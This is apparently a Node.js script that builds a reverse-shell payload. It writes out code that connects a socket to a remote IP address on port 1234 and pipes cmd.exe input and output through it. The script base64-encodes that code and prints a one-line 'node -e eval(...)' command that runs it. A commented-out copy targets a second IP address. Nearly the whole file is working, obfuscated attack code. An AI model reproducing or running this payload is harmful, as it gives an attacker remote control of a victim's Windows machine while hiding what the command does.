// const codeToEncode = `
// const net = require('net');
// const { spawn } = require('child_process');
// const client = new net.Socket();
// client.connect(1234, '26.106.250.206', () => {
//     const shell = spawn('cmd.exe', [], { shell: true });
//     client.pipe(shell.stdin);
//     shell.stdout.pipe(client);
//     shell.stderr.pipe(client);
// });
// `.trim();

// // Convert the string to a Buffer and then to Base64
// const base64Encoded = Buffer.from(codeToEncode).toString('base64');

// console.log("--- Encoded Base64 Payload ---");
// console.log(base64Encoded);

/*

node -e "eval(Buffer.from('YOUR_BASE64_STRING_HERE', 'base64').toString())"

*/





const ip = "10.69.7.202";
const port = 1234;

// Use ${variable} to inject the values into the string
const payload = `
const net=require('net'),{spawn}=require('child_process'),client=new net.Socket();
client.connect(${port},'${ip}',()=>{
    const s=spawn('cmd.exe',[],{shell:true});
    client.pipe(s.stdin);
    s.stdout.pipe(client);
    s.stderr.pipe(client);
});`;

// const payload = `
// const net=require('net'),{spawn}=require('child_process'),client=new net.Socket();
// client.connect(1234,'10.69.7.202',()=>{
//     const s=spawn('cmd.exe',[],{shell:true});
//     client.pipe(s.stdin);
//     s.stdout.pipe(client);
//     s.stderr.pipe(client);
// });`;

const encoded = Buffer.from(payload).toString('base64');
const command = `node -e "eval(Buffer.from('${encoded}','base64').toString())"`;

console.log("Use this command to run the script:");
console.log(command);



